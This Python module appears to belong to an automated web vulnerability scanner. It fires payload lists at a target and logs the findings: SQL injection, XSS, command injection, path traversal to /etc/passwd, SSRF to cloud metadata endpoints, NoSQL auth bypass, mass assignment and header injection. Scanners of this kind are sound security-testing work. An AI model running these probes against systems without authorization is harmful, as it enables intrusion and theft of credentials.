from __future__ import annotations

import json
import time
from dataclasses import dataclass
from urllib.parse import urljoin, urlparse

from .collectors import AsyncRequestor
from .models import AuditEvidence, slugify, utc_now

COMMON_INJECTABLE_PARAMS = [
    "q",
    "id",
    "search",
    "file",
    "path",
    "url",
    "name",
    "page",
    "query",
    "redirect",
    "return",
    "next",
    "callback",
]

SQLI_PAYLOADS = ["' OR 1=1--", "' UNION SELECT NULL--", "' AND SLEEP(5)--"]
SQLI_ERROR_SIGNATURES = [
    "sql syntax",
    "sqlstate",
    "sqlite error",
    "psql:",
    "mysql",
    "postgres",
    "unterminated quoted string",
]
XSS_PAYLOADS = ['<script>alert("autoclaw")</script>', '"><svg/onload=alert("autoclaw")>']
CMDI_PAYLOADS = [";printf AUTOCLAW_CMDI", "|printf AUTOCLAW_CMDI", "`printf AUTOCLAW_CMDI`"]
PATH_TRAVERSAL_PAYLOADS = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
PATH_TRAVERSAL_SIGS = ["root:x:0:0:", "[fonts]", "[extensions]"]
SSTI_PAYLOADS = [("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7 * 7 %>", "49")]
SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
]
SSRF_INDICATORS = ["meta-data", "instance-id", "ami-id", "accesskeyid", "computeMetadata", "metadata-flavor"]
REDIRECT_PARAMS = ["redirect", "return", "next", "url", "target", "callback", "continue"]
REDIRECT_PAYLOAD = "https://example.com/autoclaw-redirect"
AUTH_BYPASS_PAYLOADS = [
    ("nosql-gt", {"username": {"$gt": ""}, "password": {"$gt": ""}}),
    ("boolean", {"username": True, "password": True}),
]
MASS_ASSIGNMENT_FIELDS = {
    "isAdmin": True,
    "role": "admin",
    "verified": True,
    "approved": True,
    "is_superuser": True,
}
UPLOAD_HINTS = ["upload", "file", "image", "media", "attachment", "request-url"]
AUTH_HINTS = ["auth", "login", "signin", "token", "verify", "session"]
GRAPHQL_HINTS = ["graphql", "graphiql"]
HTTP_METHOD_DANGERS = {"PUT", "DELETE", "TRACE", "CONNECT"}
GRAPHQL_INTROSPECTION_QUERY = '{"query":"{__schema{types{name}}}"}'


@dataclass(frozen=True)
class DeepModuleConfig:
    id: str
    gate: str
    label: str
    request_budget: int
    rate_limit_per_second: float
    class_name: str


DEEP_MODULE_CONFIGS = {
    "deep-injection-suite": DeepModuleConfig(
        id="deep-injection-suite",
        gate="deep-injection-suite",
        label="Deep Injection Suite",
        request_budget=40,
        rate_limit_per_second=2.0,
        class_name="advanced",
    ),
    "deep-authz-suite": DeepModuleConfig(
        id="deep-authz-suite",
        gate="deep-authz-suite",
        label="Deep AuthZ Suite",
        request_budget=35,
        rate_limit_per_second=2.0,
        class_name="advanced",
    ),
    "deep-ssrf-suite": DeepModuleConfig(
        id="deep-ssrf-suite",
        gate="deep-ssrf-suite",
        label="Server-Side Trust Suite",
        request_budget=25,
        rate_limit_per_second=1.5,
        class_name="advanced",
    ),
}


def _status_is_interesting(status_code: int) -> bool:
    return status_code < 500 and status_code != 404


async def discover_injectable_params(
    *,
    requestor: AsyncRequestor,
    target_url: str,
    routes: list[str],
    mode: str,
) -> list[dict[str, str]]:
    candidates: list[dict[str, str]] = []
    seen: set[str] = set()
    route_limit = 40 if mode == "deep" else 20
    param_limit = len(COMMON_INJECTABLE_PARAMS) if mode == "deep" else 8

    for route in routes[:route_limit]:
        url = route if route.startswith("http") else urljoin(target_url, route)
        for param in COMMON_INJECTABLE_PARAMS[:param_limit]:
            try:
                resp = await requestor.request("GET", url, params={param: "autoclaw-probe"})
            except Exception:
                continue
            if not _status_is_interesting(resp.status_code):
                continue
            key = f"{url}:{param}"
            if key in seen:
                continue
            seen.add(key)
            candidates.append({"url": url, "param": param})
            if mode != "deep":
                break
    return candidates


def select_deep_modules(*, evidence: list[AuditEvidence], routes: list[str], auth_kinds: list[str]) -> list[str]:
    selected: list[str] = []
    route_text = " ".join(routes).lower()
    kinds = {item.kind for item in evidence}

    if routes or {"browser.client_sink", "api.public_json", "path.exposed"} & kinds:
        selected.append("deep-injection-suite")
    if any(kind != "anonymous" for kind in auth_kinds) or "api.public_json" in kinds:
        selected.append("deep-authz-suite")
    if any(token in route_text for token in ["graphql", "proxy", "fetch", "url", "upload", "request-url"]):
        selected.append("deep-ssrf-suite")
    if "deep-ssrf-suite" not in selected and "browser.authenticated_route" in kinds:
        selected.append("deep-ssrf-suite")
    return selected


def _build_evidence(
    *,
    run_id: str,
    module_id: str,
    kind: str,
    title: str,
    summary: str,
    url: str,
    severity_hint: str,
    data: dict,
) -> AuditEvidence:
    return AuditEvidence(
        id=f"{run_id}-{module_id}-{slugify(kind)}-{slugify(url)}-{int(time.time() * 1000)}",
        run_id=run_id,
        timestamp=utc_now(),
        kind=kind,
        module_id=module_id,
        title=title,
        summary=summary,
        data=data,
        severity_hint=severity_hint,
        url=url,
    )


async def run_deep_injection_suite(
    *,
    run_id: str,
    module_id: str,
    target_url: str,
    requestor: AsyncRequestor,
    routes: list[str],
    mode: str,
) -> list[AuditEvidence]:
    evidence: list[AuditEvidence] = []
    injectable_params = await discover_injectable_params(
        requestor=requestor,
        target_url=target_url,
        routes=routes,
        mode=mode,
    )

    for candidate in injectable_params[:12]:
        url = candidate["url"]
        param = candidate["param"]
        path = urlparse(url).path or "/"

        for payload in SQLI_PAYLOADS[:2 if mode != "deep" else len(SQLI_PAYLOADS)]:
            try:
                resp = await requestor.request("GET", url, params={param: payload})
            except Exception:
                continue
            body_lower = resp.text.lower()
            signature = next((sig for sig in SQLI_ERROR_SIGNATURES if sig in body_lower), None)
            if signature:
                evidence.append(
                    _build_evidence(
                        run_id=run_id,
                        module_id=module_id,
                        kind="injection.sqli",
                        title="SQL injection signal",
                        summary=f"{path} surfaced an SQL error signature when {param} received an attack payload.",
                        url=url,
                        severity_hint="critical",
                        data={"param": param, "payload": payload, "signature": signature, "path": path},
                    )
                )
                break
            if "sleep" in payload.lower():
                start = time.time()
                try:
                    await requestor.request("GET", url, params={param: payload})
                except Exception:
                    continue
                elapsed = time.time() - start
                if elapsed > 4.5:
                    evidence.append(
                        _build_evidence(
                            run_id=run_id,
                            module_id=module_id,
                            kind="injection.sqli_blind",
                            title="Time-based SQL injection signal",
                            summary=f"{path} delayed materially when {param} received a time-based SQL payload.",
                            url=url,
                            severity_hint="high",
                            data={"param": param, "payload": payload, "elapsed": round(elapsed, 2), "path": path},
                        )
                    )
                    break

        for payload in XSS_PAYLOADS[:1 if mode != "deep" else len(XSS_PAYLOADS)]:
            try:
                resp = await requestor.request("GET", url, params={param: payload})
            except Exception:
                continue
            if payload in resp.text and "html" in resp.headers.get("Content-Type", "").lower():
                evidence.append(
                    _build_evidence(
                        run_id=run_id,
                        module_id=module_id,
                        kind="injection.xss",
                        title="Reflected XSS signal",
                        summary=f"{path} reflected an XSS payload through {param}.",
                        url=url,
                        severity_hint="high",
                        data={"param": param, "payload": payload, "path": path},
                    )
                )
                break

        if param.lower() in {"file", "path", "dir", "cmd", "exec", "command", "template"}:
            for payload in CMDI_PAYLOADS:
                try:
                    resp = await requestor.request("GET", url, params={param: payload})
                except Exception:
                    continue
                if "AUTOCLAW_CMDI" in resp.text:
                    evidence.append(
                        _build_evidence(
                            run_id=run_id,
                            module_id=module_id,
                            kind="injection.command",
                            title="Command injection signal",
                            summary=f"{path} echoed a command execution marker from {param}.",
                            url=url,
                            severity_hint="critical",
                            data={"param": param, "payload": payload, "path": path},
                        )
                    )
                    break

        if param.lower() in {"file", "path", "page", "template", "doc", "dir"}:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                try:
                    resp = await requestor.request("GET", url, params={param: payload})
                except Exception:
                    continue
                signature = next((sig for sig in PATH_TRAVERSAL_SIGS if sig in resp.text), None)
                if signature:
                    evidence.append(
                        _build_evidence(
                            run_id=run_id,
                            module_id=module_id,
                            kind="injection.path_traversal",
                            title="Path traversal signal",
                            summary=f"{path} returned local file content when {param} received a traversal payload.",
                            url=url,
                            severity_hint="high",
                            data={"param": param, "payload": payload, "signature": signature, "path": path},
                        )
                    )
                    break

        for payload, expected in SSTI_PAYLOADS[:1 if mode != "deep" else len(SSTI_PAYLOADS)]:
            try:
                resp = await requestor.request("GET", url, params={param: payload})
            except Exception:
                continue
            if expected in resp.text and payload not in resp.text:
                evidence.append(
                    _build_evidence(
                        run_id=run_id,
                        module_id=module_id,
                        kind="injection.ssti",
                        title="Server-side template injection signal",
                        summary=f"{path} evaluated a template expression provided through {param}.",
                        url=url,
                        severity_hint="high",
                        data={"param": param, "payload": payload, "expected": expected, "path": path},
                    )
                )
                break

        try:
            resp = await requestor.request(
                "GET",
                url,
                params={param: "value%0d%0aX-Autoclaw: injected"},
                allow_redirects=False,
            )
        except Exception:
            resp = None
        if resp and "x-autoclaw" in {key.lower() for key in resp.headers}:
            evidence.append(
                _build_evidence(
                    run_id=run_id,
                    module_id=module_id,
                    kind="injection.crlf",
                    title="CRLF injection signal",
                    summary=f"{path} honored an injected header via {param}.",
                    url=url,
                    severity_hint="medium",
                    data={"param": param, "path": path},
                )
            )

    redirect_targets = [route if route.startswith("http") else urljoin(target_url, route) for route in routes[:20]]
    redirect_targets.append(target_url)
    for url in redirect_targets:
        for param in REDIRECT_PARAMS:
            try:
                resp = await requestor.request("GET", url, params={param: REDIRECT_PAYLOAD}, allow_redirects=False)
            except Exception:
                continue
            location = resp.headers.get("Location", "")
            if REDIRECT_PAYLOAD in location:
                evidence.append(
                    _build_evidence(
                        run_id=run_id,
                        module_id=module_id,
                        kind="injection.open_redirect",
                        title="Open redirect signal",
                        summary=f"{urlparse(url).path or '/'} redirected to an attacker-controlled location through {param}.",
                        url=url,
                        severity_hint="high",
                        data={"param": param, "location": location},
                    )
                )
                break

    for header_name in ("Host", "X-Forwarded-Host", "X-Host"):
        try:
            resp = await requestor.request("GET", target_url, headers={header_name: "autoclaw.invalid"}, allow_redirects=False)
        except Exception:
            continue
        if "autoclaw.invalid" in resp.text or "autoclaw.invalid" in resp.headers.get("Location", ""):
            evidence.append(
                _build_evidence(
                    run_id=run_id,
                    module_id=module_id,
                    kind="injection.host_header",
                    title="Host header injection signal",
                    summary=f"The target reflected an injected {header_name} value.",
                    url=target_url,
                    severity_hint="high",
                    data={"header": header_name},
                )
            )
            break

    return evidence


async def run_deep_authz_suite(
    *,
    run_id: str,
    module_id: str,
    target_url: str,
    requestor: AsyncRequestor,
    routes: list[str],
    prior_evidence: list[AuditEvidence],
) -> list[AuditEvidence]:
    evidence: list[AuditEvidence] = []

    auth_routes = [route for route in routes if any(token in route.lower() for token in AUTH_HINTS)]
    for route in auth_routes[:8]:
        url = route if route.startswith("http") else urljoin(target_url, route)
        for label, payload in AUTH_BYPASS_PAYLOADS:
            try:
                resp = await requestor.request(
                    "POST",
                    url,
                    headers={"Content-Type": "application/json"},
                    json=payload,
                )
            except Exception:
                continue
            body = resp.text.lower()
            if any(token in body for token in ['"token"', '"jwt"', '"authenticated":true', '"success":true']):
                evidence.append(
                    _build_evidence(
                        run_id=run_id,
                        module_id=module_id,
                        kind="authz.auth_bypass",
                        title="Authentication bypass signal",
                        summary=f"{urlparse(url).path or '/'} accepted a malformed auth payload ({label}).",
                        url=url,
                        severity_hint="critical",
                        data={"payload": payload, "label": label},
                    )
                )
                break

    public_json = [item for item in prior_evidence if item.kind == "api.public_json"]
    for item in public_json[:10]:
        route = str(item.data.get("route") or "")
        sample_ids = item.data.get("sample_ids") or []
        if not route or not sample_ids:
            continue
        base_id = int(sample_ids[0])
        for neighbor_id in {base_id - 1, base_id + 1}:
            if neighbor_id <= 0:
                continue
            url = urljoin(target_url, f"{route.rstrip('/')}/{neighbor_id}")
            try:
                resp = await requestor.request("GET", url, headers={"Accept": "application/json"})
            except Exception:
                continue
            if resp.status_code != 200:
                continue
            try:
                payload = resp.json()
            except ValueError:
                continue
            evidence.append(
                _build_evidence(
                    run_id=run_id,
                    module_id=module_id,
                    kind="authz.idor",
                    title="IDOR signal",
                    summary=f"{route} exposed a neighboring object identifier ({neighbor_id}).",
                    url=url,
                    severity_hint="high",
                    data={"route": route, "neighbor_id": neighbor_id, "response_sample": payload},
                )
            )
            break

    candidate_routes = [
        route
        for route in routes
        if any(token in route.lower() for token in ["user", "account", "profile", "admin", "member"])
    ]
    for route in candidate_routes[:6]:
        url = route if route.startswith("http") else urljoin(target_url, route)
        try:
            resp = await requestor.request(
                "POST",
                url,
                headers={"Content-Type": "application/json"},
                json=MASS_ASSIGNMENT_FIELDS,
            )
        except Exception:
            continue
        if resp.status_code in {401, 403, 404, 405}:
            continue
        body = resp.text.lower()
        accepted = [field for field in ["isadmin", "role", "is_superuser", "verified", "approved"] if field in body]
        if accepted:
            evidence.append(
                _build_evidence(
                    run_id=run_id,
                    module_id=module_id,
                    kind="authz.mass_assignment",
                    title="Mass assignment signal",
                    summary=f"{urlparse(url).path or '/'} reflected privileged fields after over-posting.",
                    url=url,
                    severity_hint="high",
                    data={"accepted_fields": accepted, "sent_fields": MASS_ASSIGNMENT_FIELDS},
                )
            )

    return evidence


async def run_deep_ssrf_suite(
    *,
    run_id: str,
    module_id: str,
    target_url: str,
    requestor: AsyncRequestor,
    routes: list[str],
) -> list[AuditEvidence]:
    evidence: list[AuditEvidence] = []
    injectable_params = await discover_injectable_params(
        requestor=requestor,
        target_url=target_url,
        routes=routes,
        mode="deep",
    )

    for candidate in injectable_params:
        url = candidate["url"]
        param = candidate["param"]
        if param.lower() not in {"url", "link", "href", "src", "dest", "redirect", "fetch", "proxy", "callback", "uri", "endpoint", "target"}:
            continue
        for payload in SSRF_TARGETS:
            try:
                resp = await requestor.request("GET", url, params={param: payload}, headers={"Metadata-Flavor": "Google"})
            except Exception:
                continue
            body = resp.text.lower()
            indicator = next((item for item in SSRF_INDICATORS if item.lower() in body), None)
            if indicator:
                evidence.append(
                    _build_evidence(
                        run_id=run_id,
                        module_id=module_id,
                        kind="ssrf.metadata_access",
                        title="SSRF signal",
                        summary=f"{urlparse(url).path or '/'} retrieved server-side metadata through {param}.",
                        url=url,
                        severity_hint="critical",
                        data={"param": param, "payload": payload, "indicator": indicator},
                    )
                )
                break

    graphql_routes = [route for route in routes if any(token in route.lower() for token in GRAPHQL_HINTS)]
    if not graphql_routes:
        graphql_routes = ["/graphql", "/api/graphql"]
    for route in graphql_routes[:4]:
        url = route if route.startswith("http") else urljoin(target_url, route)
        try:
            resp = await requestor.request(
                "POST",
                url,
                headers={"Content-Type": "application/json"},
                data=GRAPHQL_INTROSPECTION_QUERY,
            )
        except Exception:
            continue
        if resp.status_code == 200 and "__schema" in resp.text:
            evidence.append(
                _build_evidence(
                    run_id=run_id,
                    module_id=module_id,
                    kind="api.graphql_introspection",
                    title="GraphQL introspection signal",
                    summary=f"{urlparse(url).path or '/'} exposed GraphQL introspection data.",
                    url=url,
                    severity_hint="high",
                    data={"route": route},
                )
            )
            break

    upload_routes = [route for route in routes if any(token in route.lower() for token in UPLOAD_HINTS)]
    for route in upload_routes[:4]:
        url = route if route.startswith("http") else urljoin(target_url, route)
        try:
            resp = await requestor.request(
                "POST",
                url,
                headers={"Content-Type": "application/json"},
                json={"name": "autoclaw-test.txt", "size": 12, "contentType": "text/plain"},
            )
        except Exception:
            continue
        body = resp.text.lower()
        if resp.status_code == 200 and any(token in body for token in ["presigned", "upload", "s3", "blob", "url"]):
            evidence.append(
                _build_evidence(
                    run_id=run_id,
                    module_id=module_id,
                    kind="api.upload_abuse",
                    title="Upload abuse signal",
                    summary=f"{urlparse(url).path or '/'} generated an upload artifact without additional proof of authorization.",
                    url=url,
                    severity_hint="critical",
                    data={"route": route},
                )
            )

    method_routes = [route for route in routes if route.startswith("/")][:8]
    for route in method_routes:
        url = urljoin(target_url, route)
        try:
            resp = await requestor.request("OPTIONS", url)
        except Exception:
            continue
        allow = {item.strip().upper() for item in resp.headers.get("Allow", "").split(",") if item.strip()}
        dangerous = sorted(allow & HTTP_METHOD_DANGERS)
        if dangerous:
            evidence.append(
                _build_evidence(
                    run_id=run_id,
                    module_id=module_id,
                    kind="api.dangerous_method",
                    title="Dangerous HTTP methods exposed",
                    summary=f"{route} advertised potentially dangerous methods: {', '.join(dangerous)}.",
                    url=url,
                    severity_hint="medium",
                    data={"route": route, "dangerous": dangerous, "allow": sorted(allow)},
                )
            )

    return evidence
